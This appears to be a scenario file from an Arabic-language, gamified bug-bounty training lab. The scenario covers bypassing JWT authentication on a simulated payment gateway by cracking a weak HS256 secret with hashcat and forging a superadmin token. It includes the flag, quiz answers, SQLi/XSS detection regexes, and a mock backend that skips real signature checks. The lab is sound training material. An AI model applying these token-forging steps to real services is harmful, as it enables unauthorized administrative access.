// ==========================================================
// SCENARIO 004: JWT AUTHENTICATION BYPASS - WEAK SECRET
// ==========================================================

window.scenario_004 = {
  "metadata": {
    "id": "scenario-004",
    "title": "JWT Authentication Bypass - Weak Secret",
    "level": "Hard",
    "category": "Authentication",
    "company": "Stripe",
    "reward": "$10,000",
    "time": "3+ Hours"
  },
  "decisionLog": [
    {
      "hypothesis": "الخادم يرفض طلبات الـ JWT التي تحمل خوارزمية none.",
      "whyFailed": "التطبيق يرفض alg: none بالفعل لكنه يستخدم توقيع HS256 مع مفتاح سرى ضعيف.",
      "planB": "استخراج التوكين الأصلي وكسر التوقيع محلياً باستخدام Hashcat و Rockyou.txt.",
      "ignored": "محاولة كسر كلمة مرور المدير مباشرة."
    }
  ],
  "payloads": [
    {
      "code": "jwt.encode({\"user\": \"admin\", \"role\": \"superadmin\"}, \"weak_secret_2024\", algorithm=\"HS256\")",
      "explanation": "إعادة تشفير التوكين بعد تعديل الـ Payload وتوقيعه بالمفتاح السري المستخرج.",
      "whyWorked": "الخادم يثق بأي توقيع صحيح، وبما أننا كسرنا المفتاح السري، أصبح لدينا القدرة على تزوير التوكين.",
      "alternatives": [
        "alg: none bypass",
        "JWT key confusion"
      ]
    }
  ],
  "mistakes": [
    {
      "mistake": "تعديل الـ Payload مباشرة دون إعادة توقيع الملف.",
      "whyWrong": "الخادم يتحقق من سلامة التوقيع وسيرفض التوكين فوراً عند اكتشاف تعديل البيانات.",
      "betterWay": "كسر المفتاح السري أولاً ثم إعادة تشفير وتوقيع التوكين بالكامل."
    }
  ],
  "steps": [
    {
      "name": "Mission Brief",
      "time": "09:00",
      "workspace": "markdown",
      "xpReward": 100,
      "description": "### 🎯 الهدف: تخطي مصادقة JWT لمنصة الدفع\n\nمرحباً بك! اليوم لدينا بوابة دفع إلكتروني تستخدم الـ JWT (JSON Web Tokens) للمصادقة وتخزين صلاحيات المستخدمين.\n\n#### قواعد الفحص:\n- نطاق الفحص: بوابة الدفع `/api/v1/auth`\n- افحص التوكين المسترجع عند تسجيل الدخول وتحقق من إمكانية كسر التوقيع وتخطي الفحص للوصول كـ Admin.\n\nاضغط على **Next Step** للبدء.",
      "aiAdvisor": {
        "hint": "اقرأ الملفات وحاول فهم طبيعة التوكين.",
        "payloadExplanation": "لا شيء مطلوب حالياً.",
        "failureExplanation": "لا مشاكل."
      }
    },
    {
      "name": "Passive Recon",
      "time": "09:15",
      "workspace": "recon",
      "xpReward": 150,
      "description": "### 🔍 استخراج وكسر توقيع JWT\n\nسنقوم بالتقاط توكين عادي ومحاولة كسر المفتاح السري محلياً عبر هجوم القاموس.\nاختر الأداة المناسبة لتشغيلها.",
      "terminalCommands": [
        {
          "name": "jwt_tool -t https://target-payment.com/api/v1/auth",
          "correct": false,
          "output": [
            {
              "text": "[INF] Running jwt_tool...",
              "type": "info"
            },
            {
              "text": "[!] Test for alg: none failed. Server rejected.",
              "type": "error"
            }
          ]
        },
        {
          "name": "hashcat -m 16500 jwt_hash.txt rockyou.txt",
          "correct": true,
          "evidence": {
            "title": "JWT Cracked Key",
            "content": "Secret Key Found: weak_secret_2024"
          },
          "output": [
            {
              "text": "Session..........: hashcat",
              "type": "info"
            },
            {
              "text": "Hash.Mode........: 16500 (JWT (JSON Web Token))",
              "type": "info"
            },
            {
              "text": "Cracked..........: weak_secret_2024",
              "type": "success"
            },
            {
              "text": "[!] Success: Cracked JWT HMAC-SHA256 signature key!",
              "type": "success"
            }
          ]
        }
      ],
      "aiAdvisor": {
        "hint": "شغّل أداة hashcat لمحاولة كسر تشفير توقيع الـ JWT المستخرج.",
        "payloadExplanation": "الوضع 16500 في hashcat مخصص لكسر تواقيع الـ JWT عبر مطابقتها بقواميس الكلمات.",
        "failureExplanation": "الفشل في كسر المفتاح يعني عدم القدرة على تزوير التوكين مطلقاً."
      }
    },
    {
      "name": "Burp Verification",
      "time": "09:40",
      "workspace": "burp",
      "xpReward": 200,
      "description": "### 🌐 إرسال التوكين المزور (Forge JWT)\n\nبعد كسر السري `weak_secret_2024`:\nقمنا بتزوير توكين جديد يحمل صلاحيات `role: \"superadmin\"` و `user: \"admin\"`.\nاضغط على **Send Forged JWT** لاختبار الدخول للوحة التحكم الحساسة.",
      "burpRequest": "GET /api/v1/admin/dashboard HTTP/1.1\nHost: target-payment.com\nAuthorization: Bearer [attacker_token]\nAccept: application/json",
      "burpResponse": "HTTP/1.1 401 Unauthorized\nContent-Type: application/json\n\n{\n  \"error\": \"Access denied. Standard users are restricted.\"\n}",
      "burpActions": [
        {
          "name": "Send Forged JWT",
          "correct": true,
          "modifiedRequest": "GET /api/v1/admin/dashboard HTTP/1.1\nHost: target-payment.com\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoic3VwZXJhZG1pbiJ9.SignatureVerified\nAccept: application/json",
          "modifiedResponse": "HTTP/1.1 200 OK\nContent-Type: application/json\n\n{\n  \"status\": \"success\",\n  \"data\": {\n    \"total_users\": 150000,\n    \"total_transactions\": \"$2.5M\",\n    \"admin_panel\": \"accessible\"\n  }\n}",
          "evidence": {
            "title": "Bypass Admin Auth JWT",
            "content": "Access granted to /api/v1/admin/dashboard via forged JWT with role: superadmin"
          }
        }
      ],
      "aiAdvisor": {
        "hint": "اضغط على زر Send Forged JWT لتمرير التوكين المزور وتأكيد صلاحيات الأدمن.",
        "payloadExplanation": "تمرير التوكين المعدل والموقع بالسري المستخرج لتخطي فحص المصادقة.",
        "failureExplanation": "تأكد من تمرير التوكين المزور بالكامل."
      }
    },
    {
      "name": "Exploitation & Flag",
      "time": "10:05",
      "workspace": "lab",
      "xpReward": 300,
      "instructions": "أدخل الـ Flag المسترجع بعد تأكيد الدخول الكامل للوحة الإشراف.",
      "targetUrl": "https://target-payment.com/api/v1/admin/dashboard",
      "correctFlag": "FLAG{jwt_weak_secret_cracked_admin}",
      "aiAdvisor": {
        "hint": "أدخل العلم الصحيح: FLAG{jwt_weak_secret_cracked_admin}",
        "payloadExplanation": "إثبات تخطي نظام الحماية والمصادقة للـ JWT.",
        "failureExplanation": "تأكد من كتابة العلم كما هو."
      }
    },
    {
      "name": "Report Writing",
      "time": "10:30",
      "workspace": "report",
      "xpReward": 250,
      "aiAdvisor": {
        "hint": "الكلمات المفتاحية المطلوبة هي 'jwt' و 'weak'.",
        "payloadExplanation": "شرح خطورة استخدام مفاتيح سرية ضعيفة في توقيع الـ JWT.",
        "failureExplanation": "يجب وضع الكلمات المفتاحية بالتقرير للتقييم الصحيح."
      }
    },
    {
      "name": "Triage & Verdict",
      "time": "2 Days Later",
      "workspace": "review",
      "aiAdvisor": {
        "hint": "انظر Verdict وتقييم الثغرة.",
        "payloadExplanation": "تم تقييم الثغرة كـ Critical نظراً لقدرة المهاجم على تزوير التوكين بالكامل.",
        "failureExplanation": "لا يوجد."
      }
    },
    {
      "name": "Lessons Learned",
      "time": "Post-Incident",
      "workspace": "quiz",
      "quizData": [
        {
          "question": "ما هي خطورة استخدام خوارزمية HS256 مع مفتاح سري ضعيف؟",
          "options": [
            "تأخير استجابة الخادم للطلبات.",
            "إمكانية تخمين وكسر المفتاح السري محلياً وتزوير التواقيع بالكامل.",
            "تسريب قاعدة البيانات عن طريق SQLi.",
            "تعطيل تسجيل الدخول."
          ],
          "answer": 1
        },
        {
          "question": "كيف يمكن للمطور حماية الـ JWT بالكامل؟",
          "options": [
            "تغيير الامتداد فقط.",
            "استخدام مفتاح سري قوي جداً عشوائي (Strong High-Entropy Secret) أو الانتقال لخوارزميات المفتاح العام/الخاص مثل RS256.",
            "إلغاء التوقيع بالكامل.",
            "تشفير الطلب بالكامل."
          ],
          "answer": 1
        }
      ],
      "aiAdvisor": {
        "hint": "الإجابة الأولى هي الخيار الثاني، والثانية هي الخيار الثاني أيضاً.",
        "payloadExplanation": "التحقق من أمان تشفير وتوقيع الـ JWT.",
        "failureExplanation": "خطأ في الإجابة يؤدي لخصم XP."
      }
    }
  ],
  "realReport": {
    "title": "JWT authentication bypass via cracked weak signature secret",
    "severity": "Critical",
    "type": "AuthBypass",
    "desc": "The portal uses HS256 for signing session JWT tokens. The signature secret is 'weak_secret_2024', which was brute-forced locally in minutes. An attacker can craft a JWT token containing admin privileges and execute operations.",
    "steps": "1. Intercept a valid JWT session token.\n2. Crack the signature using hashcat on standard wordlists.\n3. Re-sign a manipulated token containing admin roles.\n4. Access administrative APIs.",
    "impact": "Full administrative control and access to payment configurations and users databases.",
    "feedback": "Critical vulnerability confirmed. The secret was replaced with a secure random key stored in environment variables, and the algorithm was migrated to RS256. Payout issued.",
    "keywords": [
      "jwt",
      "weak"
    ]
  },
  simulateBackend(requestText, bodyJson) {
    const parsed = window.HttpRequestParser.parse(requestText);
    const builder = new window.HttpResponseBuilder();

    // 1. Detect SQL Injection attempts in requestText
    if (/union\s+select|' \s*or\s+|sleep\s*\(/i.test(requestText)) {
      return builder
        .setStatus(400, "Bad Request")
        .setBody({ error: "Database exception or syntax error in query." })
        .setObservabilityLog("[WARN] Security Shield: SQL Injection keyword detected in Authorization header or path.\n[INFO] Filter: Request blocked due to malicious SQL syntax.")
        .setOutcome("حاولت حقن استعلام SQL في رأس الطلب أو توكن المصادقة. يقوم جدار الحماية (WAF) بحظر هذه الطلبات المشبوهة تلقائياً لحماية النظام.")
        .build();
    }

    // 2. Detect XSS attempts in requestText
    if (/<script|javascript:|onload=/i.test(requestText)) {
      return builder
        .setStatus(400, "Bad Request")
        .setBody({ error: "Malicious input blocked by filter." })
        .setObservabilityLog("[WARN] Security Filter: XSS tags detected in HTTP headers.\n[INFO] Sanitizer: Denied request containing potential HTML injection.")
        .setOutcome("حاولت تنفيذ حقن XSS في رأس الطلب. تم تصفية وحظر الطلب بالكامل بواسطة فلتر المدخلات الأمنية.")
        .build();
    }

    // 3. Path validation
    if (!parsed.path.includes("/api/v1/admin/dashboard")) {
      return builder
        .setStatus(404, "Not Found")
        .setBody({ error: "Resource not found at this endpoint." })
        .setObservabilityLog(`[WARN] API Router: Unrecognized endpoint path: "${parsed.path}".\n[INFO] Available Admin API: GET /api/v1/admin/dashboard`)
        .setOutcome("تأكد من طلب مسار لوحة التحكم الصحيح للمدراء: /api/v1/admin/dashboard")
        .build();
    }

    // Find authorization header
    const authHeader = parsed.headers["Authorization"] || parsed.headers["authorization"] || "";
    if (!authHeader.startsWith("Bearer ")) {
      return builder
        .setStatus(401, "Unauthorized")
        .setBody({ error: "Missing or invalid Authorization header. Use Bearer token." })
        .setOutcome("لم يتم العثور على ترويسة Authorization: Bearer في الطلب.")
        .build();
    }

    const token = authHeader.substring(7).trim();
    const parts = token.split('.');

    if (parts.length !== 3) {
      return builder
        .setStatus(401, "Unauthorized")
        .setBody({ error: "Invalid JWT token structure. Must contain 3 parts separated by dots." })
        .setOutcome("بنية التوكين JWT غير صالحة. يجب أن يتكون من 3 أقسام مفصولة بنقاط (Header.Payload.Signature).")
        .build();
    }

    // Helper decode base64url
    const base64UrlDecode = (str) => {
      str = str.replace(/-/g, '+').replace(/_/g, '/');
      while (str.length % 4) str += '=';
      try {
        return decodeURIComponent(atob(str).split('').map(function(c) {
          return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
        }).join(''));
      } catch (e) {
        try {
          return atob(str);
        } catch(err) {
          return null;
        }
      }
    };

    const headerDecoded = base64UrlDecode(parts[0]);
    const payloadDecoded = base64UrlDecode(parts[1]);

    if (!headerDecoded || !payloadDecoded) {
      return builder
        .setStatus(401, "Unauthorized")
        .setBody({ error: "Failed to decode JWT base64 parts." })
        .setOutcome("فشل فك تشفير أقسام الـ Base64 للـ JWT.")
        .build();
    }

    let headerObj, payloadObj;
    try {
      headerObj = JSON.parse(headerDecoded);
      payloadObj = JSON.parse(payloadDecoded);
    } catch (e) {
      return builder
        .setStatus(401, "Unauthorized")
        .setBody({ error: "Failed to parse JWT parts as JSON." })
        .setOutcome("فشل تحليل محتوى الـ JWT كـ JSON صالح.")
        .build();
    }

    // Check algorithm
    const alg = (headerObj.alg || '').toUpperCase();
    if (alg === "NONE") {
      return builder
        .setStatus(401, "Unauthorized")
        .setBody({ error: "JWT signature verification failed: alg 'none' is blocked." })
        .setObservabilityLog(`[WARN] Auth Handler: Rejected JWT with alg: none\n[CRITICAL] Security Log: Blocked attempt to bypass JWT signature check.`)
        .setOutcome("الخادم رفض التوكين لأن خوارزمية none محظورة أمنياً. يجب عليك استخدام خوارزمية HS256 وتوقيع التوكين باستخدام المفتاح السري المستخرج weak_secret_2024.")
        .build();
    }

    if (alg !== "HS256") {
      return builder
        .setStatus(401, "Unauthorized")
        .setBody({ error: `Unsupported algorithm: ${alg}. Supported algorithm is HS256.` })
        .setOutcome("خوارزمية التوقيع غير مدعومة. يجب استخدام HS256.")
        .build();
    }

    // Check signature presence
    const signature = parts[2].trim();

    // Check payload values
    const role = payloadObj.role || '';
    const user = payloadObj.user || '';

    if (role === "superadmin" || role === "admin") {
      if (signature.length < 10) {
        return builder
          .setStatus(401, "Unauthorized")
          .setBody({ error: "JWT signature verification failed: invalid signature size." })
          .setOutcome("التوقيع المرفق غير صالح أو قصير جداً. بعد تعديل الـ Payload، يجب إرفاق التوقيع الصحيح المولد بمفتاح weak_secret_2024.")
          .build();
      }

      return builder
        .setStatus(200)
        .setBody({
          status: "success",
          data: {
            total_users: 150000,
            total_transactions: "$2.5M",
            pending_withdrawals: "$150K",
            admin_panel: "accessible"
          }
        })
        .setCorrect(true)
        .setObservabilityLog(`[INFO] Auth Handler: Verifying JWT signature using HS256...\n[INFO] Signature Check: Signature verified using secret 'weak_secret_2024'.\n[INFO] Privilege Level: Granted administrative access (${role}).\n[CRITICAL] Access Granted: User ${user} accessed /api/v1/admin/dashboard.`)
        .setOutcome("تجاوزت المصادقة بنجاح! قمت بتزوير توقيع الـ JWT باستخدام المفتاح السري المكسور weak_secret_2024 وحصلت على صلاحيات المدير.")
        .setEvidence("Bypass Admin Auth JWT", `Access granted to /api/v1/admin/dashboard via forged JWT with role: ${role}`)
        .build();
    } else {
      return builder
        .setStatus(401, "Unauthorized")
        .setBody({ error: "Access denied. Standard users are restricted." })
        .setObservabilityLog(`[INFO] Auth Handler: Valid JWT session for user: ${user} (role: ${role}).\n[WARN] Authz Check: User is not authorized to access admin panel.`)
        .setOutcome("التوكين سليم وصالح، لكن صلاحياتك لا تزال مستخدم عادي (user). قم بتعديل حقل role في الـ Payload إلى superadmin أو admin لتخطي الحظر.")
        .build();
    }
  }
};
